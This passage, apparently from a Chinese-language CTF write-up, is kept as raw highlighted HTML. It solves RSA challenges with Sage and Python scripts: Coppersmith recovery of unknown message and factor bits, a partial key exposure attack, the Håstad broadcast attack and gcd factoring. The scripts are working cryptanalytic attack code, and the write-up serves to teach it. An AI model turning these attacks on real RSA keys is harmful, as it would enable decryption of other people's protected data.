number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> skr_part <span class="token operator">+</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>            result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(result)</span>            <span class="token keyword">if</span>  result <span class="token operator">==</span> cipher<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="✅Challenge-1"><a href="#✅Challenge-1" class="headerlink" title="✅Challenge 1"></a>✅Challenge 1</h2><p>密文高位已知，未知低比特攻击。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x5ab3c00a116dc6834ed79ad55036f3a81cf7d4cb41098118ca9efe1ccff298b951259a668da68c607e0ed85db54ac5243aaa380f0259e67f05a13de2b5f1e081c47e03d3cd785ccc182b316d87ac2be82a34dee2af8814dc70b55d33c1b5a7c300f07ba8a1086aaac63da37b234842661e971f533d65dacce3b477eb1232efb5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x41522844c262cd5e8c5d3064d1719131ba1803f6e35b3ad4c5838f758dcdc7201e296b3966bad4839b280017af8c788a13702a99aa0faddc4588c0091e3a728825e6b022dc1c3c9ec06a00cb54454e280daacd81ef822ee362d09d0ecb798d15e20918173aefe733b40b533205996de6a6ab3650827662065c03985e2dc6266aL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">>></span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token operator">=</span>0x765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503000000000000000000L<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python">e <span class="token operator">=</span> <span class="token number">0x3</span>b <span class="token operator">=</span> 0x9e67d3a220a3dcf6fc4742052621f543b8c78d5d9813e69272e65ac676672446e5c88887e8bfdfc92ec87ec74c16350e6b539e3bd910b000000000000000000Ln <span class="token operator">=</span> 0xa1888c641a05aeb81b3d1686317a86f104791fe1d570a5b11209f45d09ea401d255a70744e7a2d39520e359c23a9f1209ee47f496dbd279e62ee1648b3a277ced8825298274322e0a7a86deea282676310a73b6bb946fc924c34ac6c8784ff559bf9a004c03fb167ef54aaea90ce587f2f3074b40d7f632022ec8fb12e659953Lc<span class="token operator">=</span>0x93145ece45f416a11e5e9475518f165365456183c361500c2f78aff263028c90f20b7d97205f54e21f3bcc8a556b457889fde3719d0a0f9c9646f3f0d0a1e4bee0f259f023168fe8cc0511848c1635022fcc20b6088084585e2f8055a9d1b1d6bdb228087900bf7c6d42298f8e45c451562c816e2303990834c94e580bf0cbd1L<span class="token comment" spellcheck="true">#72bits未知</span>kbits<span class="token operator">=</span><span class="token number">72</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token operator">^</span>e<span class="token operator">-</span>cx0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"x: %s"</span> <span class="token operator">%</span>hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 765a5c92257d16f953ce13eb83bb338727e1eff15a5f4e75251f9d82e719620a008f88d5946a943963d403e1bf395ce6b8b93edcadb503750332f65eeb1e19a8</span></code></pre><h2 id="✅Challenge-2"><a href="#✅Challenge-2" class="headerlink" title="✅Challenge 2"></a>✅Challenge 2</h2><p>已知部分因数高Bit，未知低比特攻击。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">2</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#from sage.all import *</span><span class="token comment" spellcheck="true">#import binascii</span>n <span class="token operator">=</span> <span class="token number">0x68f56087cddf01e39e938d40df9a28bc9e5579d19d2763e7361ee464ae79e503d99a1c07eeec8c95cd928eb1ce41e0ba01bed85c45b2c0bc3c8ec04327f702d28f2983e9a8672c11cbb4a53279f22666ad5e6329d3ca32607f2d1b14f79315df440be17e254a59f614fb0bee9d49f3706c8dd67427cf7cc542324e15cbe27657</span>p4 <span class="token operator">=</span><span class="token number">0xedbe4e8eb2ba136c89848560f57b081e6e49a2ae7457ff5093b6b7182f484453fe8b1b51bb207618af5d5d06dc16c099</span>cipher <span class="token operator">=</span> 0x109824d42a3b891f9a6f3c21efa09cf01f59ad8d8b85953a515e4fd9799e72cce08328a200b17fb901508b0395964936e35fb698be4ab3fc275255bb2aaa49a6546df3f8963b543e2759c6ab517f9c1b4a0d9e3eba1a09ce35fec8025d286e56d7bbde2e2fa7b05402857b2425ff9a27034c9c04ccf703ba562ccf0726be2fe5Le2 <span class="token operator">=</span> <span class="token number">65537</span>pbits <span class="token operator">=</span> <span class="token number">512</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>    q <span class="token operator">=</span> n<span class="token operator">/</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    flag <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 191445a91032bc5eb2f1ffc6db4db109b3c46e5b1d3cf92279d63712c7ae16725db646496b02c6a04c648e46bdc8430d82f39a240323fca0cc1ab38b16e5c107</span></code></pre><h2 id="✅Challenge-3"><a href="#✅Challenge-3" class="headerlink" title="✅Challenge 3"></a>✅Challenge 3</h2><p>已知部分私钥，但私钥高比特未知，Partial Key Exposure Attack(部分私钥暴露攻击)。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>d <span class="token operator">=</span> 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token comment" spellcheck="true"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span>    n <span class="token operator">=</span> <span class="token number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"kbits : "</span><span class="token punctuation">,</span> kbits     d0 <span class="token operator">=</span> <span class="token number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token comment" spellcheck="true"># print d</span>    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 856119b6bdb17543c2089fefb23173e6cf6aff2d0c755760ac97fb9b3ca869a0875b5052f5a4dcef4c64c76ae97de9897398a79b291a851f2ebffef6dde90fdf</span></code></pre><h2 id="✅Challenge-4"><a href="#✅Challenge-4" class="headerlink" title="✅Challenge 4"></a>✅Challenge 4</h2><p>给出三组(n,c)，采用低指数广播攻击。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span>n3<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        N <span class="token operator">*=</span> i    Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N <span class="token operator">/</span> i<span class="token punctuation">)</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long<span class="token punctuation">(</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    m3 <span class="token operator">=</span> X <span class="token operator">%</span> N    m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>broadcast<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>若是给出两组n的话，直接可以采用求两个n的公约数的方法进行攻击。</p><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># from libnum import gcd</span><span class="token comment" spellcheck="true"># n1=0xb4e9991d2fac12b098b01118d960eb5470261368e7b1ff2da2c66b4302835aa845dd50a4f749fea749c6d439156df6faf8d14ce2a57da3bac542f1843bfc80dfd632e7a2ef96496a660d8c5994aea9e1b665097503558bc2756ab06d362abe3777d8c1f388c8cd1d193955b70053382d330125bdc2cdc836453f1a26cec1021cbb787977336b2300f38c6ba881a93d2a2735f8f0d32ea2d0e9527eb15294dd0867c8030d1f646bd121c01706c247cd1bf4aa209d383ffb748b73ec1688dc71812675834b4b12d27a63b5b8fcc47394d16897ff96af49f39d8d5b247553fbf8fac7be08aab43d9ce5659cd5cfaf7d73edbcfe854d997ae4b28d879adf86641707</span><span class="token comment" spellcheck="true"># #  e1=0x10001</span><span class="token comment" spellcheck="true"># #  c1=0x3a10c58ed3e8f9eade48dad7d36518dabeeca3d169c848f3b4b2bb027220e13d8b071c55046b14213e966ad9c381e5cad9773d455aa0d36ddff9b9f24873d0979f1caff95d9569e4f312514c7e01979b39c466aa2d27ad521ae3c1ea2025ca2290185b3d79da4f6e4c7e77a70f206bd5c41eec65fd64f86c317b8207ca511b8297b597cb9c24afa652c1f1c7f2d8ca61cf4a63b17df165e4c02dc19578305f276cb81fdfadf0ffc8b86e13297f2692edf7e6324878bb8ca960a050af6b0ada8ba4accd72c7d2c74a41e98d801093e4cc5b1572b8e6be9f270c30759543986180bb4fc6863e14638ea74863dbdd1624cfdedaedb99dfd48901e7d4b486a7b13ea</span><span class="token comment" spellcheck="true"># 